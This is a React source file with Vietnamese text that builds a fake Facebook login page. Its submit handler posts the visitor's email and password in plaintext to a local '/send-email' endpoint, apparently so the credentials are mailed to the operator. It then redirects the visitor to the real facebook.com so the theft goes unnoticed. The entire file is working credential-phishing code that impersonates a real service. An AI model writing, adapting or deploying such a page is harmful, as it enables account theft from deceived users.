import React, { useState } from 'react';
import 'bootstrap/dist/css/bootstrap.min.css';
import './App.css';
import Cookies from 'js-cookie'; // Import thư viện js-cookie

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();
    if (email === "" || password === "") {
      setError("Bạn phải nhập thông tin để tiếp tục.");
    } else {
      // Gửi email với thông tin đăng nhập
      try {
        const response = await fetch('http://localhost:3000/send-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ email, password })
        });

        const data = await response.json();
        console.log('Email đã được gửi:', data);
        window.location.href = "https://www.facebook.com/"; 

      } catch (error) {
        console.log('Lỗi khi gửi email:', error);
        alert('Không thể gửi email');
      }
    }
  };


  return (
    <div className="App">
      <div className="container d-flex justify-content-center align-items-center" style={{ height: '100vh' }}>
        <div className="card p-4" style={{ width: '400px' }}>
          <h1 className="text-center text-primary mb-4">Facebook</h1>
          {error && <div className="alert alert-danger">{error}</div>}
          <form onSubmit={handleLogin}>
            <div className="form-group mb-2">
              <input
                type="text"
                className="form-control"
                placeholder="Email hoặc số điện thoại"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>
            <div className="form-group mb-3">
              <input
                type="password"
                className="form-control"
                placeholder="Mật khẩu"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>
            <button type="submit" className="btn btn-primary btn-block">Đăng nhập</button>
          </form>
          <div className="d-flex justify-content-between mt-3">
            <a href="#">Quên tài khoản?</a>
            <a href="#">Đăng ký Facebook</a>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
